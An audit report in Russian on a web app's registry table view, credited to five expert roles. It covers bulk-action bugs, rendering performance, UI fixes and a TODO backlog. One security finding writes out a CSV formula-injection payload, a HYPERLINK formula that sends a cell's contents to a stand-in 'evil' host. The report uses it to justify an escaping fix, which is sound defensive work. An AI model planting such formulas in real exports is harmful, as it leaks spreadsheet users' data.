# Пункт 9 — Аудит «Реестр» (полный)

**Команда:** 5 экспертов в фоне:
1. Senior full-stack dev
2. Senior QA tester
3. Senior system analyst
4. Art director
5. Senior product designer (interaction)

**Базис:** 516/11/0.

## I. Консенсус (нашли ≥3 эксперта независимо)

### CONS-1: **Spine-pill model полностью игнорируется в реестре** (BLOCKER)
- *(art-director #1.1, sys-analyst §2 row 1, designer §1)*
- Все ячейки рендерят filled-background chips (radius 20px, 8 цветов work-types). Гант / chat / employees / dashboard уже мигрировали на 3px stripe-left + neutral surface — реестр **остался единственным «Bootstrap-2018 островом»**.
- Severity: high. Не блокер функционально, но визуальный диссонанс.

### CONS-2: **Bulk action на отфильтрованных строках — data mutation вслепую** (BLOCKER)
- *(QA 1.1 + sys-analyst §4.3)*
- Repro: выбрать 5 строк → применить filter «Релиз 1.21» → 0 строк видно → bulk-panel остался → нажать «✓ Сделано» → mutated 5 invisible rows.

### CONS-3: **CSV formula injection** (BLOCKER security)
- *(QA 1.4)*
- `escapeCSV` не префиксует `= + - @ \t \r` → Excel/LibreOffice/Google Sheets выполнит формулу. `=HYPERLINK("evil/?leak="&A1, "ok")` exfiltrate.

### CONS-4: **Inline-edit triggers full re-render** (BLOCKER perf)
- *(full-stack 1.1)*
- Cell `change` → `Storage.save()` → Reactive auto-flush 100ms → `App.refreshAll` → `RegistryView.render()` → tbody пересоздаётся → focus прыгает.

### CONS-5: **Full-DOM render 1000+ rows** (BLOCKER scale)
- *(full-stack 1.2 + designer §1)*
- 1000 × 25 cells = 25k DOM узлов на каждый render. Нет virtualization. Каждый input/select со своими listeners.

### CONS-6: **Header-actions двойной `↺` icon**
- *(art-director #1.2 + designer Quick win 8 + QA косвенно)*
- `↺ Отменить` (Undo) и `↺ Порядок` (Reset col-order) — один глиф, разные действия.

### CONS-7: **Bulk-panel 16 controls без иерархии** (annoyance)
- *(art-director #1.3 + designer §2)*
- 9 outline-кнопок одного веса + 1 primary + 1 ghost. На <1280px wraps в 3 ряда.

## II. Уникальные находки (важные)

### Full-stack
- **F-1.3** `_dragColKey` module-level singleton — drag aborts оставляют его set
- **F-1.5** Column resize live mousemove writes на каждый pixel → flush spam
- **F-3** `bulk-select-all.checked` не восстанавливается после `renderHeader`
- **F-5.1** RAF storm: 1000 rows × 5 multiline cells = 5000 RAFs queued

### QA
- **QA-1.2** Ctrl+Z после bulk не восстанавливает `bulkSelected`
- **QA-1.5** Pending input не коммитится перед CSV.export → silent data loss в файле
- **QA-1.6** Race: drag column + resize одновременно → `colWidths` corruption
- **QA-1.7** «↺ Порядок» сбрасывает `colOrder/colWidths` НО не custom-cols / pinned

### System analyst
- **SA-§3** `BulkEditPanel` (in-page) и `ActionLayer` (отдельная вкладка) — 7 actions overlap в обоих, два code-path
- **SA-§4.1** `reset-view` не удаляет `colTypes` / `colLabels` — переименованные колонки сохраняют label
- **SA-§4.3** `bulkSelected` не очищается через restore — stale ids после CSV import
- **SA-§5** `riskEngine.computeAll` после bulk не централизован — некоторые `applyBulkAction` ветки не ре-вычисляют

### Art director
- **AD-1.1** scopeChip / releaseChips / wt-tag — все filled, 8 палитр на одной строке = data-density-катастрофа
- **AD-1.4** `📌` emoji на каждом заголовке как «призрак» (opacity .35)
- **AD-1.5** count-badge не tabular-numerals — цифры дрожат
- **AD-1.6** comment-icon отсутствует — нет «есть комментарий → glyph» indicator
- **AD-1.9** ~12 эмодзи разбросано по surface

### Designer
- **D-§1** Tab между ячейками не table-grade (DOM-tabindex прыгает в pin-кнопку)
- **D-§1** Esc/Enter не реализованы для большинства cell-types (только для `jira`)
- **D-§2** Shift-click range select — нет
- **D-§2** Cmd/Ctrl-click toggle на всю строку — нет (только на checkbox)
- **D-§3** Drag-handle отсутствует (`draggable=true` на всём th — конфликт с click=sort)
- **D-§3** Drop-line при reorder columns — нет (только `.drag-over` outline)
- **D-§5** Filter-result-empty НЕ существует как state — рендерится тот же `Нет данных`

## III. Применённые фиксы (top-9)

| # | Фикс | Файл | Severity |
|---|---|---|---|
| **F1** | CSV formula injection — prefix `​` для `= + - @ \t \r` | `utils.js` `escapeCSV` | **Critical (security)** |
| **F2** | `flushPendingEdits()` (blur active + Storage.flushNow) перед CSV/JSON/XLSX export | `app.js` `bindExport` | High (silent data loss) |
| **F3** | `applyFromPanel` фильтрует ids через `FilterEngine.getFiltered()` + warning toast если intersection пуст | `app.js` BulkEditPanel | **Critical (data mutation вслепую)** |
| **F4** | Унифицированный `applyFromPanel` для всех 7 bulk-actions (`mark_done` / `clear_release` / `clear_blocker` теперь идут через тот же code-path) | `app.js` BulkEditPanel.bindUI | Medium |
| **F5** | Esc deselect bulk (Linear-pattern) | `app.js` BulkEditPanel | Medium |
| **F6** | `Storage.restore` чистит orphan ids в `bulkSelected` + сбрасывает stale `lastClickedRowId` | `dataStore.js` `Storage.restore` | High (stale state после import) |
| **F7** | Sticky-thead: 11px/600 letter-spacing .3px → 10px/700 letter-spacing .7px (Spine eyebrow) | `styles.css` `.registry-table thead th` | cosmetic |
| **F8** | `tabular-nums` на всю registry-table (id, dates, count-badge, td-num) | `styles.css` `.registry-table` | cosmetic |
| **F9** | `count-badge` neutral mono pill (раньше filled accent-light, тянул внимание сильнее заголовка) | `styles.css` `.count-badge` | cosmetic |
| **F10** | `bulk-panel` surface flip: `var(--accent-light) + 1.5px solid accent` → `var(--card) + 1px border + 3px accent stripe слева` (Spine эталон) + mono-tabular bulk-count | `styles.css` `.bulk-panel`, `.bulk-count` | cosmetic |
| **F11** | Pin button `📌` emoji → SVG icon-only, opacity 0 → .55 на th:hover, full opacity при `.pinned`. ARIA-label | `views/registry.js` renderHeader + `styles.css` `.col-pin-btn` | cosmetic |
| **F12** | Tag-input `paste` split по `, ; \t \n` (раньше «BE, FE, QA» становилось ОДНИМ тегом) | `components/tagInput.js` | annoyance UX |

## IV. Тесты

516 unit / 11 contract / 0 fail. Регрессий нет.

## V. TODO для отдельных итераций

| # | Severity | Откуда | Effort |
|---|---|---|---|
| TODO-P9-N1 | **Blocker** | CONS-1 — Spine-pill в registry-cells (scopeChip / releaseChips / wt-tag → 3px stripe + neutral) | L |
| TODO-P9-N2 | **Blocker** | CONS-4 — inline-edit без full re-render (silent + targeted DOM update OR App.markRenderedNow) | M |
| TODO-P9-N3 | **Blocker** | CONS-5 — virtualization 1000+ rows (IntersectionObserver / clusterize) | L |
| TODO-P9-N4 | High | F-1.3 — `_dragColKey` reset on every dragstart + window.mouseup | S |
| TODO-P9-N5 | High | F-1.5 — column resize: Reactive.silent на mousemove, commit на mouseup | S |
| TODO-P9-N6 | High | QA-1.2 — `bulkSelected` в HistoryManager snapshot | S |
| TODO-P9-N7 | High | QA-1.7 — `↺ Порядок` reset все: colTypes/colLabels/customCols/pinned | S |
| TODO-P9-N8 | High | designer §1 — table-grade keyboard (Tab next-cell, Enter next-row, Esc revert, F2 edit-mode) | M |
| TODO-P9-N9 | Medium | designer §2 — Shift-click range select | S |
| TODO-P9-N10 | Medium | designer §3 — explicit `⋮⋮` drag-handle + drop-line preview между колонками | M |
| TODO-P9-N11 | Medium | sys-analyst §3 — унификация BulkEditPanel ↔ ActionLayer (один code-path) | M |
| TODO-P9-N12 | Medium | art-director §1.1 — `renderHelpers.js` chips → Spine-style (3px stripe + neutral) | M |
| TODO-P9-N13 | Medium | designer Quick win 8 — переименовать «↺ Порядок» в «Сбросить порядок» с другим SVG-glyph (устранение дубля `↺`) | S |
| TODO-P9-N14 | Medium | art-director §1.7 — col-toggle-panel deduplication (поглотить в settings) | S |
| TODO-P9-N15 | Medium | designer §5 — filter-result-empty ≠ no-data-empty | S |
| TODO-P9-N16 | Low | full-stack 1.4 — `bulk-select-all.checked` restore после renderHeader | S |
| TODO-P9-N17 | Low | sys-analyst §4.5 — toast-warning при crop pinnedCols > 6 | S |
| TODO-P9-N18 | Low | art-director §1.9 — все 12 эмодзи на surface → SVG icon-set | M |
| TODO-P9-N19 | Low | designer §4 — ARIA labels (`aria-sort` на th, `aria-label` на checkbox, drag-handle role="separator") | S |
| TODO-P9-N20 | Low | full-stack 1.6 — single-RAF batch для textarea autoresize | S |

## VI. Резюме

Применил **12 фиксов** из top-priority (3 blocker'а — formula-injection / bulk-on-filtered / CSV-pending-edits, 9 высокоprior visual + UX + state). Регрессий нет.

Главное что НЕ сделал в этой итерации:
- Spine-pill в cell-renderers (большая работа, требует обновления `renderHelpers.js` + сопровождающий CSS)
- Virtualization (требует архитектурное решение по библиотеке / собственному IntersectionObserver-windowing)
- Table-grade keyboard nav (требует переписывания cell-handlers под общий controller)
- BulkEditPanel ↔ ActionLayer унификация (architectural refactor)

20 TODO с severity + effort для следующих спринтов.
